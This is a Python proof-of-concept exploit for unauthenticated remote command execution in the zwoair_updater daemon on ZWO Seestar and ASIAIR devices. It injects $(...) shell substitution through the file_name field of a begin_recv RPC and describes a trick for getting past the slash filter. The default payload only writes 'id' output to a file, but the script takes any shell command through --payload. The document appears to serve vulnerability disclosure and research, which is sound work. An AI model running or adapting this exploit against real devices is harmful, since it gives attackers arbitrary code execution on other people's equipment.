#!/usr/bin/env python3
"""
Proof-of-concept: Unauthenticated Remote Code Execution in zwoair_updater.

Affected: every ZWO product that ships the zwoair_updater daemon, including
the Seestar family (S30/S30P/S50), the ASIAIR family (Mini/Plus/Pro) and
ASI cameras with built-in ASIAIR (ASI2600MC Air and successors).

Channel: TCP 4350 (cmd) + TCP 4360 on ASIAIR / integrated-ASIAIR cameras,
TCP 4361 on Seestar (file).

Bug: the updater's begin_recv RPC accepts a 'file_name' string that is later
interpolated into a shell command:

    md5sum "<update_tmp_path>/<file_name>" | cut -d' ' -f1 | tr -d '\n'

via system() / popen(). The only sanitization is rejection of literal '/'.
Any other shell metacharacter — including command-substitution syntax $(...) —
is passed through and executed by /bin/sh. This happens BEFORE md5/signature
verification, so the exploit fires regardless of whether the package would
otherwise be accepted.

This PoC sends a harmless `id > /home/pi/poc_rce.out` payload and prints the
result via a second connection. Replace --payload to adapt.

Run:
  python3 poc_rce.py 192.168.1.121 --device asiair
  python3 poc_rce.py 192.168.1.39  --device seestar
  python3 poc_rce.py 192.168.1.121                     # auto-detect
"""
import argparse
import json
import socket
import time
import sys


DEVICE_FILE_PORT = {"asiair": 4360, "seestar": 4361}


def resolve_file_port(host, device):
    if device != "auto":
        return DEVICE_FILE_PORT[device]
    for label, port in DEVICE_FILE_PORT.items():
        s = socket.socket()
        s.settimeout(2)
        try:
            s.connect((host, port))
            s.close()
            print(f"[*] auto-detect: file port {port} open → device looks like {label}")
            return port
        except OSError:
            continue
    return None


def fire(host, payload, file_port, file_len=4):
    """Run a single shell payload via the begin_recv injection.

    `payload` is the shell to run, inserted into x$(...)y. Constraint: no
    literal '/' allowed anywhere in the resulting filename — use the helper
    `R=$(echo $PATH|cut -c1)` to obtain '/' at runtime.
    """
    file_name = f"x$({payload})y"
    if "/" in file_name:
        sys.exit("[!] payload contains literal '/' — filename filter will reject")

    s_bin = socket.socket()
    s_bin.settimeout(5)
    s_bin.connect((host, file_port))

    s = socket.socket()
    s.settimeout(5)
    s.connect((host, 4350))
    banner = s.recv(4096)
    print(f"[*] banner: {banner.decode(errors='replace').strip()}")

    rpc = {
        "id": 1,
        "method": "begin_recv",
        "params": [{
            "file_len": file_len,
            "file_name": file_name,
            "run_update": False,
            "md5": "00000000000000000000000000000000",
        }],
    }
    s.sendall((json.dumps(rpc) + "\r\n").encode())
    print(f"[*] response: {s.recv(4096).decode(errors='replace').strip()}")
    s_bin.sendall(b"A" * file_len)
    time.sleep(1)
    try:
        s.settimeout(2)
        evt = s.recv(4096)
        print(f"[*] event: {evt.decode(errors='replace').strip()}")
    except socket.timeout:
        pass
    s.close()
    s_bin.close()


def main():
    ap = argparse.ArgumentParser(
        description="Run an arbitrary shell payload on a ZWO Seestar or ASIAIR "
                    "via the unauthenticated zwoair_updater command injection.",
    )
    ap.add_argument("host")
    ap.add_argument("--device", choices=("auto", "seestar", "asiair"), default="auto",
                    help="which product (default: auto-detect by probing 4360/4361)")
    ap.add_argument("--payload", default="cd;id > poc_rce.out 2>&1",
                    help="shell payload (no literal '/'). default: writes id "
                    "output to /home/pi/poc_rce.out")
    args = ap.parse_args()

    file_port = resolve_file_port(args.host, args.device)
    if file_port is None:
        sys.exit(f"[!] neither 4360 nor 4361 open on {args.host}")
    print(f"[*] target: {args.host}  (cmd 4350, file {file_port})")

    fire(args.host, args.payload, file_port)
    print("\n[+] payload fired. If exploitable, side-effects of the payload "
          "(e.g. files in /home/pi) are now present on the device.")


if __name__ == "__main__":
    main()
